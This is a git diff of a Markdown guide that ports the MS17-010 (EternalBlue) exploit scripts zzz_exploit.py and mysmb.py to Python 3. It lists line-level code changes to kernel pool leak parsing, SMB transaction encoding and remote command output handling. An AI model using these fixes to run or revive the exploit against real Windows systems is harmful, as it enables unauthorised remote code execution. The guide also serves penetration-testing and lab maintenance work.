@@ -8,7 +8,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
 
 ### The suggested changes for `zzz_exploit.py`:
 
-- Substitute:
+- Substitute `str` by `bytes`:
     ```python
     Original:
     321        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
@@ -18,6 +18,16 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
     ```
 
 - Substitute:
+    ```python
+    324,325c324,325
+    Original:
+    324            info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']
+    ---
+    Modified:
+    324            info['FRAG_POOL_SIZE'] = leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ] * X86_INFO['POOL_ALIGN']
+    ```
+
+- Substitute  `str` by `bytes`:
     ```python
     Original:
     325        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
@@ -65,83 +75,83 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
 ### The suggested changes for `mysmb.py`:
 
 - Substitute:
-```python
-Original:
-3          from impacket import smb, smbconnection, smbserver
----
-Modified:
-3          from impacket import smb, smbconnection
-```
+    ```python
+    Original:
+    3          from impacket import smb, smbconnection, smbserver
+    ---
+    Modified:
+    3          from impacket import smb, smbconnection
+    ```
 
 - Remove
-```python
-Original:
-9          try:
-10             import ConfigParser
-11         except ImportError:
-12             import configparser as ConfigParser
-```
+    ```python
+    Original:
+    9          try:
+    10             import ConfigParser
+    11         except ImportError:
+    12             import configparser as ConfigParser
+    ```
 
 - Remove:
-```python
-Original:
-17         SMBSERVER_DIR   = '__tmp'
-18         DUMMY_SHARE     = 'TMP'
-```
+    ```python
+    Original:
+    17         SMBSERVER_DIR   = '__tmp'
+    18         DUMMY_SHARE     = 'TMP'
+    ```
 
 - Substitute:
-```python
-Original:
-89         transData += (b'\x00' * padLen) + str.encode(data)
----
-Modified:
-83         if (type(data) == bytes):
-84             transData += (b'\x00' * padLen) + data
-85         else:
-86             transData += (b'\x00' * padLen) + data.encode('utf-8')
-```
+    ```python
+    Original:
+    89         transData += (b'\x00' * padLen) + str.encode(data)
+    ---
+    Modified:
+    83         if (type(data) == bytes):
+    84             transData += (b'\x00' * padLen) + data
+    85         else:
+    86             transData += (b'\x00' * padLen) + data.encode('utf-8')
+    ```
 
 - Substitute:
-```python
-Original:
-420        self.__output = '\\\\%COMPUTERNAME%\\{}\\{}'.format(self.__share,self.__outputFilename)
----
-Modified:
-417        self.__output = '\\\\127.0.0.1\\{}\\{}'.format(self.__share,self.__outputFilename)
-```
+    ```python
+    Original:
+    420        self.__output = '\\\\%COMPUTERNAME%\\{}\\{}'.format(self.__share,self.__outputFilename)
+    ---
+    Modified:
+    417        self.__output = '\\\\127.0.0.1\\{}\\{}'.format(self.__share,self.__outputFilename)
+    ```
 
 - Substitute:
-```python
-Original:
-483        self.prompt = self.__outputBuffer.decode(errors='replace').replace('\r\n','') + '>'
----
-Modified:
-489        self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
-```
+    ```python
+    Original:
+    483        self.prompt = self.__outputBuffer.decode(errors='replace').replace('\r\n','') + '>'
+    ---
+    Modified:
+    489        self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
+    ```
 
 - Substitute:
-```python
-Original:
-502        output_callback(fd.read().encode('utf-8'))
----
-Modified:
-499        output_callback(fd.read())
-```
+    ```python
+    Original:
+    502        output_callback(fd.read().encode('utf-8'))
+    ---
+    Modified:
+    499        output_callback(fd.read())
+    ```
 
 - Substitute:
-```python
-Original:
-528        print(self.__outputBuffer.decode(errors='replace'))
----
-Modified:
-525        print(self.__outputBuffer.decode())
-```
+    ```python
+    Original:
+    528        print(self.__outputBuffer.decode(errors='replace'))
+    ---
+    Modified:
+    525        print(self.__outputBuffer.decode())
+    ```
 
 - Substitute:
-```python
-Original:
-566        smbConfig.set('IPC$','path','')
----
-Modified:
-563        smbConfig.set('IPC$','path')
-```
+    ```python
+    Original:
+    566        smbConfig.set('IPC$','path','')
+    ---
+    Modified:
+    563        smbConfig.set('IPC$','path')
+    ```
